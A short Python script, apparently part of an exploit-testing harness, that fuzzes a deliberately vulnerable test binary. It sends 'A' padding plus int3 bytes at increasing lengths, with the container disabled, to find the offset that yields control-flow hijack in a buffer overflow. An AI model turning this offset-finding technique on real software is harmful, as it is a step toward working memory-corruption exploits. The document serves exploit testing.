import sys,asyncio
sys.path.insert(0,'.')
from alpha.sandbox import run_exploit

async def sweep():
    for off in range(60, 260, 4):
        payload=b'A'*off + b'\xcc'*16
        r=await run_exploit('test_targets/vulnerable/vuln_bin',
            payload_hex=payload.hex(),
            args=[payload.decode('latin-1')],
            timeout=3, use_container=False)
        sig=r.get('signal',0)
        if sig != 11:  # not SIGSEGV = interesting
            print(f'offset={off:3d} signal={sig:2d} exit={r["exit_code"]}')

asyncio.run(sweep())
print('done')
